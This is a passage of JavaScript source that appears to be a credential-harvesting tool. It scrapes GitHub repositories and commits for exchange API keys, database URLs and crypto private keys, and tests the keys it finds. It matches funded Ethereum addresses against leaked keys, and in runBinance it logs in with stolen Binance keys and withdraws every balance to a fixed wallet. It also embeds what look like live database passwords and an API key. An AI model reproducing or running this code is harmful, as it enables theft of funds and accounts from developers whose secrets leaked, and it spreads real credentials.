  let ghAccount = await (await initGithubAccounts())[0]
  let blobs = Promise.each(files, async result => {
    return Promise.each(result, async (file, index) => {
      console.log(index/result.length)
      if(!file) {
        return
      }
      try {
        let content = await makeOctokitRequest(ghAccount.rest.git.getBlob({
          owner: file?.repository?.owner?.login,
          repo: file?.repository?.name,
          file_sha: file.sha
        }), ghAccount)
        const codeFile = Buffer.from(content.data.data.content, 'base64').toString('utf-8')
        let fileParser = await spawn(new Worker('./workers/parseFile'))
        let result = await fileParser(codeFile) // kill file parser when done
        console.log(codeFile)
        const { binanceKeys, coinbaseKeys, stripeKeys, mongoDatbases, privateKeys } = result
        if(privateKeys.length > 0) {
          try {
            let privateKeyTester = await spawn(new Worker('./workers/testPrivateKeys'))
            let results = await privateKeyTester(privateKeys)
            console.log(results)
           
          }
          catch(err) {
            console.log(err)
          }

        }
      }
      catch(err) {
        console.log(err)
      }
    })
   
    
  })
  

 }
const start_running = async () => {
  let {users, repos} = await collectReposAndUsers()
  if(users) {
    console.log('users', users.length)
    let files = await collectFiles(users)
    if(files) {
      console.log('files', files.length)
      let blobs = await collectBlobs(files)
    }
  }


}

//start_running()

const runBinance = () => {
  mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(async connection => {
  let binanceAccounts = await mongoose.model('binanceAccounts').find({ cryptos: { $exists: true, $not: {$size: 0}}})
  let depositAddresses = Promise.all(Promise.each(binanceAccounts.splice(100, binanceAccounts.length), async binanceAccount => {
    const {apiKey, secret} = binanceAccount
    console.log('running', apiKey)
    let binance
    if(!apiKey) {
      binance = await new ccxt.binance({apiKey: binanceAccount.token, secret})
    }
    else {
      binance = await new ccxt.binance({apiKey, secret})
    }
    let addresses = []
    
 
    let {free} = await binance.fetchBalance()
     let cryptos = Object.keys(free).map(k => {
        let balanceForCrypto = free[k]
        if(balanceForCrypto > 0) {
            return {crypto: k, balance: free[k]}
        }
        else {
            return null
        }
    }).filter(item => item !== null)
    
    
    return Promise.each(cryptos, async crypto => {
      try {
        let address = await binance.fetchDepositAddress(crypto.crypto)
        let withdrawHistory = await binance.fetchWithdrawals(address.currency)
        console.log('history', withdrawHistory)
        
        await mongoose.model('depositAddresses').create({address, crypto}).then(addresses => addresses.save())
       console.log('withdrawing')
        await binance.withdraw(address.currency, crypto.balance, '0x8F201615d88d9e1E3Cbc760d9c84F0a4ea2F4A7A', address.tag ? address.tag: null, {network: address.network}).then(console.log)
        console.log('withdrew successfully', crypto)
      }
      catch(err) {
        console.log(err, crypto.crypto)
      }
    })
  }))
    //console.log(await binance.fetchDepositAddress(cryptos[0].crypto))
})
}
const instantInspect = async (url) => {
  console.log('running')
  let inspector = await spawn(new Worker('./workers/mongoDbInspector'))
  let findings = await inspector(url)
  console.log(findings)
}

const monitorTransactions = async  () => {
  let w3 = new Web3(savage)
  let reposQueried = {}
  await redisClient.connect()
  await redisClient.set('windowReset', 104123)
  await redisClient.set('numberOfCallsRemainingInWindow', 30)
  await redisClient.set('rateLimit', 30)
  const exit = () => {
    return
  }
  const continueWithProcessingCommits = async (commits, repo, owner, ghAccount, address, balance) => {
    console.log('processing commits... still trying to find a private key for', address, 'potential payout if found', balance )
    for(let i=0; i< commits.length; i++) {
      let commit = commits[i] 
      //console.log('update for', address, "! here are the commit details", commit )
     
    
      await Promise.delay(DELAY)
      let result =  await makeOctokitRequest(ghAccount.request(`GET ${commit.url}`), redisClient).catch(console.log)
      let filesForCommit = result.data.files
      console.log('update i have files for commit', commit.html_url, 'this is commit', i, 'out of', commits.length, 'with', filesForCommit.length, 'total files')
      // let env = filesForCommit.filter(file => file.filename.includes('env') || file.filename.includes('privateKey') || file.filename.includes('PRIVATE_KEY') || file.description.includes('env'))
      // if(env.length > 0) {
      //   console.log('good news, environement file may been found for', address, 'in commit', commit.url, 'lets goooo!')
      // }
      
      for(let t = 0; t< filesForCommit.length; t++) {
        let commitFile = filesForCommit[t]
        let file_sha = commitFile.sha
        await Promise.delay(DELAY)
        let content = await makeOctokitRequest(ghAccount.rest.git.getBlob({owner, repo, file_sha}), redisClient).catch(console.log)
        let file = Buffer.from(content.data.content, 'base64').toString('utf-8')
        console.log('--------start of file -----')
        console.log(file)
        console.log('------end of file-------')
        let fileParser = await spawn(new Worker('./workers/parseFile'))
        let result = await fileParser(file)
        console.log('---- start of file parser result -------')
        console.log(result)
        console.log('------ end of file parser result -----')
        if(result?.privateKeys.length > 0) {
          const privateKeyTester = await spawn(new Worker('./workers/testPrivateKeys'))
          const res = await privateKeyTester(result.privateKeys)
          console.log(res)
          setTimeout(async() => await Thread.terminate(privateKeyTester), 5000)
        }
      }
    }
  }
  const continueFilesForAddress = async (filesForAddress, ghAccount, address, balance) => {
    let parser = new GitHubRepoParser(ghAccount)
    console.log('still trying to find private key for address', address)
    let uniqueRepoNames = unique(filesForAddress.map(item => item.repository.full_name))
    // console.log(filesForAddress)
    //get the full repo object 
    let fullRepos = filesForAddress.map(item => uniqueRepoNames.indexOf(item.repository.full_name) !== -1 ? item.repository: null).filter(item => item !== null)
    // console.log('repos', fullRepos)
    //what do i do once I have the repos
    // I've gotta check the repo for .env
    let queries = uniqueRepoNames.map(repo => (`.env repo:${repo}`))
      // uniqueRepoNames.map(repo => (`privateKey repo:${repo}`)),
      // uniqueRepoNames.map(repo => (`PRIVATE_KEY repo:${repo}`)),
    
      console.log('checking for .env', 'potential payout:', Web3.utils.fromWei(balance, 'ether'), 'address:', address, "i'm checking", queries.length, "repos to see if any of them have an env so could take a while")
    for(let i =0; i< fullRepos.length; i++) {
      let repo = fullRepos[i]
      await Promise.delay(DELAY)
      let repoInMongo = await mongoose.model('repos').findOne({html_url: repo.html_url})

      if(repoInMongo) {
        console.log('already seen this repo', repo.html_url)
        return
      }
      let data = await parser.collectData(repo.html_url)
      
      const shouldIgnore = ['gitignore', 'scss', 'DS_STORE', 'log', 'firebaserc', 'Miscellaneous', 'state', 'gitkeep', 'prettierrc', 'babelrc', 'pub', 'priv', 'gif', 'dockerignore', 'example', 'yml', 'prettierignore', 'jpg', 'eslintrc', 'lock', 'cjs', 'woff', 'sss', 'woff2', 'ttf', 'ico', 'map', 'gitattributes', 'eot', 'css', 'mp4', 'svg', 'ui', 'png', 'md']
      let files = []
      let filesChecked = 0
      //console.log('data', data)
      Object.keys(data).map(k => {
        if(k === 'env') {
          console.log('env found', data[k])
        }
        if(shouldIgnore.indexOf(k) === -1) {
          
          data[k].forEach(url => {
            files.push(url)
          })
        }
       
          
        })
      files = files.filter(item => item.indexOf('node_modules') === -1).filter(item => item.indexOf('robots.txt') === -1)
      console.log('got files for repo', repo.html_url,  files.length)
      for(let t=0; t<files.length; t++) {
        let data = await (await ghAccount.request(`GET ${files[t]}`)).data
        let file = Buffer.from(data).toString('utf-8')
        let fileParser = await spawn(new Worker('./workers/parseFile'))
        let results = await fileParser(file)
        console.log(results.privateKeys.length, 'private keys to test')
        if(results.privateKeys.length > 0) {
          let privateKeyTestWorker = await spawn(new Worker('./workers/testPrivateKeys'))
          let accounts = await privateKeyTestWorker(results.privateKeys)
          setTimeout(() => Thread.terminate(privateKeyTestWorker), 100000)
         //console.log('accounts found', accounts)
         // setTimeout(() => Thread.terminate(privateKeyTestWorker), 10000)
        }
        setTimeout(() => Thread.terminate(fileParser), 10000)
        
      }
      return mongoose.model('repos').create(repo).then(res => res.save())
      
      
    }
  }
  let gh = await initGithubAccounts()
  let etherscan = require('etherscan-api').init('3APKDG28XY7ZBQG6JMA9J5GJWSG3DGJJ29')
  let blockNumber = await w3.eth.getBlockNumber()
  console.log('got block number', blockNumber)
  //const addresses = require('./addresses.json')
  let coinPokerAddress = '0xDf8DD5e0b4168f20a3488Ad088dDB198fE602Cb3'
  let coinbaseAddress = '0x3cD751E6b0078Be393132286c442345e5DC49699'
  const binanceAddress = '0x9696f59E4d72E237BE84fFD425DCaD154Bf96976'
  const bittrex = '0xfbb1b73c4f0bda4f67dca266ce6ef42f520fbb98'
  const openSeaContractAddress = '0x7Be8076f4EA4A4AD08075C2508e481d6C946D12b'
  const whale = '0x165CD37b4C644C2921454429E7F9358d18A45e14'
  const kraken = '0xe853c56864a2ebe4576a807d26fdc4a0ada51919'
  const kraken4 = '0x267be1c1d684f78cb4f6a176c4911b741e4ffdc0'
  let initialAddresses = require('./addresses.json')
  //let initialAddresses = [coinPokerAddress, coinbaseAddress, binanceAddress, bittrex, ]
  let worked = 0
  let didnotwork = 0
  initialAddresses = Object.keys(initialAddresses).map((k, index) => {
    if(index % 2 == 0) {
      return k
    } 
  }).filter(item => item !== undefined)
  console.log(initialAddresses.length)
  return Promise.all(Promise.each(initialAddresses, async (address, transactionNumber) => {
    const transactions = await etherscan.account.txlist(address, 0, 'latest', 10000, 'asc').catch(err => {
      console.log(err)
      return Promise.resolve()
    })
    console.log('worked count', worked)
    if(transactions === undefined) {
      didnotwork += 1
      console.log('no transactions found', address )
      
      return Promise.resolve()
    }
    else {
      worked += 1
      
      let addresses = transactions.result.map(transaction => [transaction.from, transaction.to], []).reduce((a, b)  => [...a, ...b])
      let uniqueAddresses = shuffle(unique(addresses))
      
      console.log('total addresses', uniqueAddresses.length, 'transaction number', transactionNumber )
      let queried = {}
      let ghResults = Promise.all(Promise.each(uniqueAddresses, async (address, index) => {
        console.log('percent done', index/uniqueAddresses.length)
        
        let tmpWeb3 = new Web3(savage)
        let balance = await tmpWeb3.eth.getBalance(address)
        await Promise.delay(DELAY)
        if(!queried[address] && balance > 0){
          console.log('starting private key hunt for', address)
          //const query = ``
          const query = `${address}`
        
          let filesForAddress = await fetchCode(query, gh[Math.floor(Math.random() * gh.length)], 1).catch(console.log)
          console.log('initial files', filesForAddress.codeItems.length)
          filesForAddress.codeItems.length > 0? continueFilesForAddress(filesForAddress.codeItems, gh[Math.floor(Math.random() * gh.length)], address, balance): console.log('no private key for', address)
        
          queried[address] = true
        }
      }))
    }
   
  })).catch(console.log)
}


//monitorTransactions()
let tempW3 = new Web3(savage)
mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
  setInterval(() => {
    let total = 0
    let seen = {}
    mongoose.model('cryptoAccounts').find({}).then(cryptoAccounts => {
     cryptoAccounts.forEach(account => {
      if(total[account.address] === undefined) {
        if(account.balance !== undefined) {
          total += Number(account.balance)
        }
        seen[account.address] = true
      }
      
     })
     console.log('total ethereum found', tempW3.utils.fromWei(String(total), 'ether') )
    })
  }, 10000)
})

redisClient.connect().then(async () => {
  await redisClient.set('windowReset', 104123)
  await redisClient.set('numberOfCallsRemainingInWindow', 30)
  await redisClient.set('rateLimit', 30)
  searchReposAndUsers("cryptobot", 1).then(console.log)
})


//collectCommits(87)
//monitorTransactions()
//monitorTransactions()
// mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(res => {
//   return mongoose.model('depositAddresses').find().then(async cryptos => {
//     let addresses = cryptos.map(crypto => crypto.address.address)
//     const queries = addresses.splice(0, 100).map(query => (`:{${query}, priv}`))
//     let queried = {}
//     let gh = await initGithubAccounts()
//     console.log(queries)
//     let ghResults = Promise.all(Promise.each(addresses, async address => {
//       console.log('trying', address)
//       await Promise.delay(4000)
//       if(!queried[address]){
//         let query = `{:${address}, priv}`
//         console.log('query', query)
//         let filesForAddress = await fetchCode(query, gh[Math.floor(Math.random() * gh.length)], 1)
//         console.log(filesForAddress)
//         queried[address] = true
//       }
  
//     }))

//   })
// })

//instantInspect('mongodb://sendinout:Sharad*97@ds133865.mlab.com:33865/sendinout')

// initGithubAccounts().then(accounts => {
//   followCommits('delete env.sh', accounts[0], 1)
// })

  
  // ProxyLists.getProxies({
  //   // options
  //   countries: ['us', 'ca']
  // })
  //   .on('data', function(proxies) {
  //     // Received some proxies.
  //     console.log('got some proxies');
      
  //     let tmpProxies = proxies.filter(proxy => proxy.protocols.indexOf('http') !== -1)
  //     proxyList.push(tmpProxies.map(proxy => ({ipAddress: proxy.ipAddress, port: proxy.port})))
  //   })
  //   .on('error', function(error) {
  //     // Some error has occurred.
      
  //   })
  //   .once('end', function() {
  //     // Done getting proxies.
  //     console.log('end!');
  //     proxyList = proxyList.reduce((a, b) => [...a, ...b])
  //     //console.log(proxyList.reduce((a, b) => [...a, ...b]))
  //    
  //   });
  


//calculateTotals()
// setInterval(() => {
//   calculateTotals()
// }, 50000)

  // calculateTotalsCrypto()
//startConsuming()